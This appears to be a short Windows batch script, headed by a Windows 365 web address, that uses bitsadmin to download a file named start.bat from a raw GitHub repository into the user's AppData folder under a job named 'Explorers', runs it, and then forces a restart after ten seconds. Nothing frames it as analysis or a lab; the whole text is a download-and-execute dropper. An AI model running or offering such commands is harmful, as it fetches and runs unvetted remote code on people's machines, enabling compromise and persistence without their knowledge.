https://windows365.microsoft.com/

call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/start.bat %appdata%\start.bat

call %appdata%\start.bat

call shutdown -r -t 10
